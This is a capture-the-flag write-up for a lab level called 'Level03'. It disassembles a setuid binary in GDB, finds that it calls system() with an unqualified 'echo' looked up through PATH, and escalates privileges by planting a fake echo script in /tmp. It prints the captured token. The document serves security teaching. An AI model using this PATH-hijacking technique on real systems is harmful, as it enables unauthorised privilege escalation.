# Level03 - File manipulation

As usual

```bash
$ whoami
level03
$ pwd
/home/user/level03
$ id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
$ ls
level03
$ file level03 
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
$ ./level03 
Exploit me
```

So, this time it's going to but executable manipulation. Well, the best tool for that is `GDB` so let's get to it.

For reminder, `GDB` is a debugger that can inspect what a program is doing at runtime.

Let's see what the code compile to

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	and    $0xfffffff0,%esp
   0x080484aa <+6>:	sub    $0x20,%esp
   0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:	mov    %eax,0x18(%esp)
   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:	mov    %eax,0x1c(%esp)
   0x080484bf <+27>:	mov    0x18(%esp),%eax
   0x080484c3 <+31>:	mov    %eax,0x8(%esp)
   0x080484c7 <+35>:	mov    0x18(%esp),%eax
   0x080484cb <+39>:	mov    %eax,0x4(%esp)
   0x080484cf <+43>:	mov    0x18(%esp),%eax
   0x080484d3 <+47>:	mov    %eax,(%esp)
   0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:	mov    0x1c(%esp),%eax
   0x080484df <+59>:	mov    %eax,0x8(%esp)
   0x080484e3 <+63>:	mov    0x1c(%esp),%eax
   0x080484e7 <+67>:	mov    %eax,0x4(%esp)
   0x080484eb <+71>:	mov    0x1c(%esp),%eax
   0x080484ef <+75>:	mov    %eax,(%esp)
   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
   0x08048503 <+95>:	leave  
   0x08048504 <+96>:	ret    
End of assembler dump.
```

With the help of `getegig` and `geteuid` and  `setresgid` and `setresuid`, we can assume it's doing privilege manipulation (which would also be in the theme of the project). The call `system` might also be interesting.

To inspect what is passed in the system call, we can run

```bash
(gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"
```

So it's the `system("/usr/bin/env echo Exploit me")` command that is used. Meaning it is the echo found in the $PATH that is run, not necessarily the `/bin/echo` command.

So let's fix this by using our very own echo that is definitely not a way for us to get the flag

```bash
$ mkdir /tmp/fakebin
$ echo -e '#!/bin/sh\ngetflag' > /tmp/fakebin/echo
$ chmod +x /tmp/fakebin/echo
$ export PATH=/tmp/fakebin:$PATH
$ echo $PATH
/tmp/fakebin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
$ whoami
level03
```

